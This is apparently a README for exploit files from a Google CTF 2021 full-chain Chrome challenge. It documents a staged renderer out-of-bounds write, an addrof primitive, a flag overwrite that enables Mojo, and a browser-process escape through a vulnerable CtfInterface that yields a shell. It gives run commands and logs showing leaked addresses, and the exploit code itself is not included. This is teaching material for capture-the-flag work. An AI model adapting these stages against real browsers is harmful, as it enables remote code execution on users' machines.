This directory contains the HTML files that can be loaded into the vulnerable chrome challenge to demonstrate the different stages of exploitation.

They should be copied to wherever the chromium directory is and depending on the stage of the exploit, executed with different commands.

Importantly, the location of the mojo_bindings import should be adjusted if the path is different on your system.

#### Example Usages:

[0-renderer-crash.html](0-renderer-crash.html) demonstrates the minimum proof-of-concept code for triggering the out-of-bounds write vulnerability in order to crash the renderer process. The minimum flags for running chrome are provided in the command below.
```bash
$ ./chrome --headless --disable-gpu --enable-logging=stderr --user-data-dir=/tmp/userdata 0-renderer-crash.html
[1111/084548.510303:WARNING:resource_bundle.cc(406)] locale_file_path.empty() for locale 
[1111/084548.527723:WARNING:resource_bundle.cc(406)] locale_file_path.empty() for locale 
[1111/084548.527725:WARNING:resource_bundle.cc(406)] locale_file_path.empty() for locale 
[1111/084548.556097:ERROR:gpu_init.cc(441)] Passthrough is not supported, GL is swiftshader
[1111/084548.568399:WARNING:resource_bundle.cc(406)] locale_file_path.empty() for locale 
Received signal 11 SEGV_ACCERR 2404512217ff
#0 0x55dc854a95c9 base::debug::CollectStackTrace()
#1 0x55dc85414763 base::debug::StackTrace::StackTrace()
#2 0x55dc854a90f1 base::debug::(anonymous namespace)::StackDumpSignalHandler()
#3 0x7f6f0d39c3c0 (/usr/lib/x86_64-linux-gnu/libpthread-2.31.so+0x153bf)
#4 0x55dc84b81860 Builtins_ObjectToString
  r8: 0000000000000000  r9: 0000240408048771 r10: 00003218002a4fc9 r11: 000032180020c1da
 r12: 0000321800508000 r13: 0000321800508000 r14: 0000240400000000 r15: 0000240408204b09
  di: 00000000000080de  si: 0000240408203e99  bp: 00007ffc3e58a430  bx: 0000000000000000
  dx: 0000240408004b71  ax: 0000240408048771  cx: 0000240451221800  sp: 00007ffc3e58a408
  ip: 000055dc84b81860 efl: 0000000000010287 cgf: 002b000000000033 erf: 0000000000000004
 trp: 000000000000000e msk: 0000000000000000 cr2: 00002404512217ff
[end of stack trace]
[1111/084548.735641:ERROR:headless_shell.cc(423)] Abnormal renderer termination.
```

[0-renderer-addrof-dbg.html](0-renderer-addrof-dbg.html) demonstrates the minimum proof-of-concept code for using the out-of-bounds write vulnerability to create the addrof object primitive. Additionally, it demonstrates the debugging technique of introducing an infinite loop on a non-crashing function in order to debug the renderer process.
```bash
$ ./chrome --headless --disable-gpu --enable-logging=stderr --user-data-dir=/tmp/userdata 0-renderer-addrof-dbg.html 
[1111/084719.469815:WARNING:resource_bundle.cc(406)] locale_file_path.empty() for locale 
[1111/084719.488287:WARNING:resource_bundle.cc(406)] locale_file_path.empty() for locale 
[1111/084719.488274:WARNING:resource_bundle.cc(406)] locale_file_path.empty() for locale 
[1111/084719.514548:ERROR:gpu_init.cc(441)] Passthrough is not supported, GL is swiftshader
[1111/084719.543897:WARNING:resource_bundle.cc(406)] locale_file_path.empty() for locale 
[1111/084719.558807:INFO:CONSOLE(24)] "1111", source: file:///home/user/full-chain-practice/google-ctf-21/full_chain/exploits/browser/0-renderer-addrof-dbg.html (24)
```

[1-renderer-exploit.html](1-renderer-exploit.html) demonstrates the renderer exploit which enables mojo in the browser process. The `--remote-debugging-port=9222` flag must be added to the command for running chrome in order to execute the next phase of the exploit assuming that [2-browser-exploit.html](2-browser-exploit.html) is available in the same current directory for chrome to access.
```bash
./chrome --headless --disable-gpu --enable-logging=stderr --user-data-dir=/tmp/userdata 1-renderer-exploit.html 
[1111/085014.488743:WARNING:resource_bundle.cc(406)] locale_file_path.empty() for locale 
[1111/085014.507291:WARNING:resource_bundle.cc(406)] locale_file_path.empty() for locale 
[1111/085014.517018:WARNING:resource_bundle.cc(406)] locale_file_path.empty() for locale 
[1111/085014.531820:ERROR:gpu_init.cc(441)] Passthrough is not supported, GL is swiftshader
[1111/085014.558891:WARNING:resource_bundle.cc(406)] locale_file_path.empty() for locale 
[1111/085014.581410:INFO:CONSOLE(126)] "[+] Renderer exploit!", source: file:///home/user/Public/chromium/1-renderer-exploit.html (126)
[1111/085014.581654:INFO:CONSOLE(53)] "[+] z.length = 17476", source: file:///home/user/Public/chromium/1-renderer-exploit.html (53)
[1111/085014.581840:INFO:CONSOLE(59)] "[+] heap_upper = 0xce00000000", source: file:///home/user/Public/chromium/1-renderer-exploit.html (59)
[1111/085014.589288:INFO:CONSOLE(105)] "[+] addr_div = 0xce080519d0", source: file:///home/user/Public/chromium/1-renderer-exploit.html (105)
[1111/085014.589331:INFO:CONSOLE(107)] "[+] <HTMLDivElement> = 0x555c535cb7c0", source: file:///home/user/Public/chromium/1-renderer-exploit.html (107)
[1111/085014.589350:INFO:CONSOLE(109)] "[+] chrome_base = 0x555c47410000", source: file:///home/user/Public/chromium/1-renderer-exploit.html (109)
[1111/085014.589366:INFO:CONSOLE(115)] "[+] Overwriting flags..", source: file:///home/user/Public/chromium/1-renderer-exploit.html (115)
[1111/085014.690607:INFO:CONSOLE(220)] "[+] Browser exploit!", source: file:///home/user/Public/chromium/2-browser-exploit.html (220)
```

[2-browser-exploit.html](2-browser-exploit.html) demonstrates the browser exploit that exploits the vulnerable CtfInterface object introduced into mojo in order to execute a user-privileged shell. Importantly, the mojo_bindings path must be available and imported properly in the HTML. We can test this exploit individually by enabling mojo with the `--enable-blink-features=MojoJS` command-line flag and the `--remote-debugging-port=9222`. The full command and example usage is listed below. This exploit may take multiple throws to complete successfully.
```bash
$ ./chrome --headless --enable-blink-features=MojoJS --disable-gpu --remote-debugging-port=9222 --enable-logging=stderr --user-data-dir=/tmp/userdata 2-browser-exploit.html 
[1111/085844.500026:WARNING:resource_bundle.cc(406)] locale_file_path.empty() for locale 
[1111/085844.518774:WARNING:resource_bundle.cc(406)] locale_file_path.empty() for locale 
[1111/085844.525945:WARNING:resource_bundle.cc(406)] locale_file_path.empty() for locale 

DevTools listening on ws://127.0.0.1:9222/devtools/browser/34ef734a-0c9f-4410-af0e-b6906cf1e65a
[1111/085844.558952:ERROR:gpu_init.cc(441)] Passthrough is not supported, GL is swiftshader
[1111/085844.565969:WARNING:resource_bundle.cc(406)] locale_file_path.empty() for locale 
[1111/085844.683590:INFO:CONSOLE(220)] "[+] Browser exploit!", source: file:///home/user/Public/chromium/2-browser-exploit.html (220)
[1111/085844.929893:INFO:CONSOLE(92)] "[+] offset = -4768", source: file:///home/user/Public/chromium/2-browser-exploit.html (92)
[1111/085844.929940:INFO:CONSOLE(94)] "[-] Bad luck!", source: file:///home/user/Public/chromium/2-browser-exploit.html (94)
[1111/085845.004762:INFO:CONSOLE(220)] "[+] Browser exploit!", source: file:///home/user/Public/chromium/2-browser-exploit.html (220)
[1111/085845.245462:INFO:CONSOLE(92)] "[+] offset = -24860", source: file:///home/user/Public/chromium/2-browser-exploit.html (92)
[1111/085845.245500:INFO:CONSOLE(94)] "[-] Bad luck!", source: file:///home/user/Public/chromium/2-browser-exploit.html (94)
[1111/085845.318878:INFO:CONSOLE(220)] "[+] Browser exploit!", source: file:///home/user/Public/chromium/2-browser-exploit.html (220)
[1111/085845.552275:INFO:CONSOLE(92)] "[+] offset = 46352", source: file:///home/user/Public/chromium/2-browser-exploit.html (92)
[1111/085845.552314:INFO:CONSOLE(97)] "[+] addr_ctfi = 0x116600ef4aa0", source: file:///home/user/Public/chromium/2-browser-exploit.html (97)
[1111/085845.552332:INFO:CONSOLE(98)] "[+] addr_elm = 0x116600e9a220", source: file:///home/user/Public/chromium/2-browser-exploit.html (98)
[1111/085845.552347:INFO:CONSOLE(99)] "[+] chrome_base = 0x55ed5d7b3000", source: file:///home/user/Public/chromium/2-browser-exploit.html (99)
[1111/085845.552580:INFO:CONSOLE(107)] "[+] Probing victim...", source: file:///home/user/Public/chromium/2-browser-exploit.html (107)
[1111/085845.623435:INFO:CONSOLE(137)] "[+] Found victim!", source: file:///home/user/Public/chromium/2-browser-exploit.html (137)
[1111/085845.632756:INFO:CONSOLE(216)] "[+] Done", source: file:///home/user/Public/chromium/2-browser-exploit.html (216)
$ whoami
user
```
